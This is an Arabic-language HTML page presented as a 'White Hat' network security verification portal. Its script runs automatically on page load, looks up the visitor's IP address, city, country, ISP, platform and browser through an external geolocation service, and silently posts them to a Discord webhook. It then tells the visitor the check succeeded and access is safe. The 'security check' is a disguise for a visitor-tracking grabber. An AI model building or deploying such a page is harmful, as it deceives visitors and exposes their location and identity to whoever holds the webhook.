<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>White Hat.#9995 | Security Portal</title>
    <style>
        :root {
            --primary: #00ff41; /* لون الهكر التقليدي */
            --bg: #0a0a0a;
            --card: #161616;
        }
        body {
            background-color: var(--bg);
            color: white;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background: var(--card);
            padding: 2rem;
            border-radius: 15px;
            border: 1px solid var(--primary);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            text-align: center;
            max-width: 400px;
            z-index: 1;
        }
        h1 { color: var(--primary); margin-bottom: 10px; }
        p { color: #888; font-size: 0.9rem; }
        .status { margin-top: 20px; font-weight: bold; color: var(--primary); }
        
        /* تأثيرات خلفية Matrix بسيطة */
        #matrix {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0; opacity: 0.1;
        }
        .footer {
            margin-top: 30px;
            font-size: 0.8rem;
            border-top: 1px solid #333;
            padding-top: 10px;
        }
        .dev-name { color: var(--primary); font-weight: bold; }
    </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="container">
    <h1>WHITE HAT</h1>
    <p>نظام التحقق من أمن الشبكة وتتبع الاختراقات</p>
    
    <div id="loader" class="status">جاري فحص الاتصال...</div>

    <div class="footer">
        تم التطوير بواسطة: <span class="dev-name">Soel</span><br>
        حقوق النشر © 2026 | White Hat.#9995
    </div>
</div>

<script>
    // إعدادات الويب هوك (ضع الرابط الخاص بك هنا)
    const WEBHOOK_URL = "ضع_رابط_الديسكورد_هنا";

    async function captureData() {
        try {
            // جلب الـ IP والمعلومات الجغرافية
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();

            const payload = {
                embeds: [{
                    title: "🚀 تسجيل دخول جديد - White Hat System",
                    color: 65281,
                    fields: [
                        { name: "👤 المطور", value: "Soel", inline: true },
                        { name: "🌐 عنوان IP", value: data.ip, inline: true },
                        { name: "📍 الموقع", value: `${data.city}, ${data.country_name}`, inline: true },
                        { name: "🏢 المزود", value: data.org, inline: false },
                        { name: "💻 النظام", value: navigator.platform, inline: true },
                        { name: "📱 المتصفح", value: navigator.userAgent.split(') ')[1], inline: true }
                    ],
                    footer: { text: "White Hat.#9995 | Security Audit" },
                    timestamp: new Date()
                }]
            };

            // إرسال البيانات للديسكورد
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            document.getElementById('loader').innerText = "تم التحقق بنجاح. الدخول آمن.";
        } catch (error) {
            document.getElementById('loader').innerText = "فشل في الاتصال بالخادم.";
        }
    }

    // تأثير الماتريكس للخلفية
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);

    function draw() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#0F0";
        ctx.font = fontSize + "px arial";
        for (let i = 0; i < drops.length; i++) {
            const text = letters.charAt(Math.floor(Math.random() * letters.length));
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(draw, 33);
    
    // بدء العملية
    window.onload = captureData;
</script>

</body>
</html>
